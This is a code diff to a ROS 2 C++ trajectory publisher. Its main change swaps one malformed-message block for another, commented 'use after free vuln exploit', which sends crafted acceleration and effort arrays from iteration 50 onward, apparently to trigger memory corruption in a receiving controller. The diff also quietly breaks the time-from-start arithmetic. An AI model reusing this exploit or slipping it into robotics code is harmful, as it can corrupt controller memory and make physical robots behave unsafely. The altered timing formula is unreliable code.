@@ -43,11 +43,7 @@ int main(int argc, char ** argv)
   trajectory_msgs::msg::JointTrajectoryPoint trajectory_point_msg;
   trajectory_point_msg.positions.resize(chain.getNrOfJoints());
   trajectory_point_msg.velocities.resize(chain.getNrOfJoints());
-  
-  // UAF
-  trajectory_point_msg.accelerations.resize(10);
-  trajectory_point_msg.effort.resize(5);
-  
+
   double total_time = 3.0;
   int trajectory_len = 200;
   int loop_rate = static_cast<int>(std::round(trajectory_len / total_time));
@@ -70,26 +66,23 @@ int main(int argc, char ** argv)
 
     joint_positions.data += joint_velocities.data * dt;
 
-    if (i == 0) {
-      trajectory_point_msg.accelerations[0] = -5.0;
-      trajectory_point_msg.accelerations[1] = 1.1;
-      trajectory_point_msg.accelerations[2] = 2.2;
-      trajectory_point_msg.accelerations[3] = 3.3;
-      trajectory_point_msg.accelerations[4] = 4.4;
+    // use after free vuln exploit
+    if (i >= 50) {
+      trajectory_point_msg.accelerations.resize(9);
+      trajectory_point_msg.accelerations[0] = 8.0;
+      for (int j = 1; j < 9; j++) {
+        trajectory_point_msg.accelerations[j] = 10.0 + j;
+      }
       
-      // will be written to freed memory
-      trajectory_point_msg.effort[0] = 42.0;
-      trajectory_point_msg.effort[1] = 13.37;
-      trajectory_point_msg.effort[2] = 99.99;
-      trajectory_point_msg.effort[3] = 77.77;
-      trajectory_point_msg.effort[4] = 55.55;
+      trajectory_point_msg.effort.resize(9);
+      trajectory_point_msg.effort[0] = 3.0;
+      
+      for (int j = 1; j < 9; j++) {
+        trajectory_point_msg.effort[j] = 50.0 + j;
+      }
     } else {
-      for (int j = 0; j < 10; j++) {
-        trajectory_point_msg.accelerations[j] = 0.0;
-      }
-      for (int j = 0; j < 5; j++) {
-        trajectory_point_msg.effort[j] = 0.0;
-      }
+      trajectory_point_msg.accelerations.clear();
+      trajectory_point_msg.effort.clear();
     }
 
     trajectory_point_msg.time_from_start.sec = i / loop_rate;
@@ -105,7 +98,7 @@ int main(int argc, char ** argv)
   trajectory_point_msg.time_from_start.nanosec = static_cast<int>(
     1E9 / loop_rate *
     static_cast<double>(
-      trajectory_len - loop_rate * (trajectory_len / loop_rate)));
+      trajectory_len - loop_rate * (trajectory_len / trajectory_len)));
   trajectory_msg.points.push_back(trajectory_point_msg);
 
   pub->publish(trajectory_msg);
